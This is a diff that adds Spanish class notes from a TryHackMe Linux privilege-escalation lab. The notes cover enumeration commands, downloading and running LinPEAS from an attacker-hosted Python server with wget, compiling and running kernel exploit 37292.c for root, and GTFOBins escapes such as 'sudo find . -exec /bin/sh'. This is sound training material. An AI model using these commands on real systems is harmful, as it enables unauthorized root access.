@@ -760,3 +760,135 @@ sudo proxychains nikto -h <HOST>
   1. Acceder a `about:config` en la barra de direcciones.
   2. Buscar `media.peerconnection.enabled`.
   3. Cambiar su valor a `off`.
+
+
+# Notas de la Clase (16-01-2025)
+
+## Linux Privilege Escalation (TryHackMe)
+
+### Enumeración para Escalación
+
+1. **Credenciales de usuario:** 
+   - Tenemos `user` y `pass`.
+   - Accedemos mediante `ssh`.
+
+2. **Comandos básicos de enumeración:**
+   ```bash
+   hostname
+   whoami
+   uname -a
+   cat /proc/version
+   sudo -l
+   cat /etc/passwd
+   history
+   ifconfig
+   netstat -tuln -tnp -an
+   pwd
+   env
+   id
+   cat /etc/crontab
+   ls -la
+   systemctl list-timers
+   ```
+
+3. **Herramientas adicionales:**
+   - `Pspy`: Monitorear procesos en ejecución.
+   - Buscar binarios SUID:
+     ```bash
+     find / -perm -u=s -type f 2>/dev/null
+     ```
+   - Buscar capacidades:
+     ```bash
+     getcap -r / 2>/dev/null
+     ```
+
+### Enumeración Automática
+
+- Descargamos [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
+- Configuramos un servidor Python para transferir archivos:
+  ```bash
+  python3 -m http.server 8080
+  ```
+- En la máquina atacada:
+  ```bash
+  wget http://<IP>:8080/linpeas.sh
+  chmod +x linpeas.sh
+  ./linpeas.sh
+  ```
+- Identificamos vulnerabilidades (CVE) como:
+  - **DirtyCow**
+  - **OverlayFS**
+
+---
+
+## Kernel Exploits
+
+1. Verificamos la versión del kernel en la máquina atacada:
+   ```bash
+   lsb_release -a
+   ```
+   - Ejemplo: `Ubuntu 14.04`.
+
+2. Usamos `searchsploit` para buscar exploits:
+   ```bash
+   searchsploit 3.13.0
+   ```
+   - Descargamos el exploit: `37292.c`.
+
+3. Configuramos un servidor Python para transferir el exploit a la máquina atacada.
+
+4. Compilamos el exploit:
+   ```bash
+   gcc 37292.c -o privesc
+   ```
+
+5. Ejecutamos el exploit:
+   ```bash
+   ./privesc
+   ```
+   - Resultado: Acceso root.
+
+---
+
+## Sudo Exploitation
+
+1. Conectamos nuevamente por `ssh` y configuramos una shell interactiva:
+   ```bash
+   bash
+   ```
+
+2. Transferimos `linpeas.sh` usando un servidor Python y configuramos permisos:
+   ```bash
+   chmod +x linpeas.sh
+   ```
+
+3. Verificamos permisos de sudo:
+   ```bash
+   sudo -l
+   ```
+
+4. Consultamos [GTFOBins](https://gtfobins.github.io/) para identificar comandos vulnerables.
+   - Ejemplo del profesor:
+     ```bash
+     sudo find . -exec /bin/sh \; -quit
+     ```
+
+---
+
+## SUID Exploitation
+
+1. Accedemos mediante `ssh` y recopilamos información:
+   ```bash
+   uname -a
+   ```
+
+2. Verificamos binarios con permisos SUID:
+   ```bash
+   find / -perm -u=s -type f 2>/dev/null
+   ```
+
+3. Consultamos la página de GTFOBins para identificar comandos SUID vulnerables.
+   - En el caso del ejercicio: `base64`.
+   - Ejecutamos los comandos sugeridos en GTFOBins para aprovechar la vulnerabilidad.
+
+---
